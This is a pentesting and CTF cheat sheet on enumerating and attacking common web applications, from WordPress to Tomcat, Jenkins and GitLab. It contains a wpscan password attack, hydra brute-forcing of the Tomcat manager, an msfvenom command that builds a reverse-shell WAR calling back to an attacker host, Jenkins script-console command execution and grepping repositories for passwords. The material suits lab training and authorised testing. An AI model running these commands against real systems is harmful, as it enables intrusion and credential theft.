# Attacking Common Applications — CTF & Pentesting Cheat Sheet

This document provides a **high-level methodology** for discovering, enumerating, and attacking commonly encountered applications during **CTFs, HTB labs, and authorised penetration tests**.

---

## Notetaking Setup
Keeping detailed logs and notes will help us greatly with the final report. Set up the skeleton of the report at the beginning of the assessment so we can begin filling in certain sections of the report while waiting for a scans to finish.

- External Penetration - < Test Client Name >  
  - Scope (including in-scope IP addresses/ranges, URLs, any fragile hosts, testing timeframes, and any limitations or other relative information we need handy)  
  - Client Points of Contact  
  - Credentials  
  - Discovery/Enumeration  
    - Scans  
    - Live hosts   
  - Application Discovery   
    - Scans
    - Interesting/Notable Hosts  
  - Exploitation  
    - < Hostname or IP > 
    - < Hostname or IP >  
  - Post-Exploitation  
    - < Hostname or IP >  
    - < Hostname or IP >
   

## Application Discovery & Enumeration
Before attacking any application, it is critical to **identify what is running**, how it is configured, and what attack surface exists.

### Key Enumeration Goals
- Identify application type and version
- Detect authentication mechanisms
- Discover exposed endpoints and admin panels
- Identify third-party plugins or integrations

### Common Techniques
```bash
whatweb http://target
nmap -sV -p 80,443 target
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list.txt
````

```bash
gobuster dir -u http://target -w wordlist.txt
```

### Webpage Screen Shots
Done with eyewitness
```bash
sudo apt install eyewitness
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list.txt
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```
---

## Content Management Systems (CMS)

### Target Platforms
* WordPress
* Drupal
* Joomla

### Enumeration Strategy
* Identify CMS and version
* Enumerate plugins, themes, and users
* Check for outdated or vulnerable components

### Common Attacks
* Exploiting vulnerable plugins/themes
* Weak admin credentials
* File upload vulnerabilities
* Configuration file exposure

### Example Tools & Commands
* Try to browse the following directories /wp-admin /wp-content /wp-content/plugins /wp-content/themes... look for readme.xt files within
* Check out /robots.xml file

```bash
curl -s http://blog.inlanefreight.local | grep WordPress
curl -s http://blog.inlanefreight.local/ | grep themes
curl -s http://blog.inlanefreight.local/ | grep plugins
curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
wpscan --url http://blog.inlanefreight.local --enumerate
wpscan --password-attack xmlrpc -t 20 -U duog -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
wpscan --url http://target --enumerate vp,vt,u
```

```bash
droopescan scan drupal -u http://target
```

---

## ☕ Tomcat & Jenkins

### Apache Tomcat

**What to Look For**

* `/manager/html` or `/host-manager`
* Default credentials
* WAR file upload functionality

**Attack Methods**

```bash
hydra -l tomcat -P passwords.txt http-get://target/manager/html
```

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker LPORT=4444 -f war > shell.war
```

---

### Jenkins

**What to Look For**

* Anonymous access
* Script Console (`/script`)
* Stored credentials

**Attack Methods**

```groovy
println "id".execute().text
```

```bash
curl http://target/script
```

---

## 📊 Infrastructure Monitoring Tools

### Splunk

**Enumeration**

* Login portals (`/en-US/account/login`)
* Default credentials
* Installed apps

**Common Attacks**

* Command execution via scripted inputs
* Credential reuse
* Abusing saved searches

```bash
splunk search 'index=_internal'
```

---

### PRTG Network Monitor

**Enumeration**

* Web interface discovery
* API endpoints
* Version identification

**Common Attacks**

* Auth bypass vulnerabilities
* Credential reuse
* Command execution via notifications

```bash
nmap -p 80,443 --script http-enum target
```

---

## 🎟️ Customer Service & Configuration Management Tools

### osTicket

**Enumeration**

* Public ticket submission
* File upload functionality
* Admin panel exposure

**Common Attacks**

* Uploading malicious attachments
* Ticket-based command injection
* Credential harvesting

```bash
gobuster dir -u http://target/osticket -w wordlist.txt
```

---

### GitLab

**Enumeration**

* Public repositories
* CI/CD pipelines
* Issue trackers

**Common Attacks**

* Leaked secrets in repos
* CI job command execution
* OAuth misconfigurations

```bash
git clone http://target/repo.git
```

```bash
grep -r "password" .
```

---

## 🧪 Other Commonly Seen Applications

| Application   | Attack Focus                      |
| ------------- | --------------------------------- |
| phpMyAdmin    | Weak creds, file import           |
| Adminer       | DB access, file uploads           |
| Webmin        | Auth bypass, RCE                  |
| Elasticsearch | Open APIs, data exposure          |
| Kibana        | Console abuse                     |
| Grafana       | Default creds, dashboard exploits |

Example:

```bash
curl http://target:9200/_cat/indices?v
```

---

## 🛡️ Application Hardening – Core Concepts

Understanding hardening helps attackers **recognise misconfigurations**.

### Key Defensive Controls

* Strong authentication and MFA
* Patch management
* Least privilege access
* Input validation
* Secure file upload handling
* Proper logging and monitoring

### Attacker Indicators of Weak Hardening

* Default credentials work
* Outdated software versions
* Anonymous or guest access
* Sensitive endpoints exposed
* Excessive permissions

---



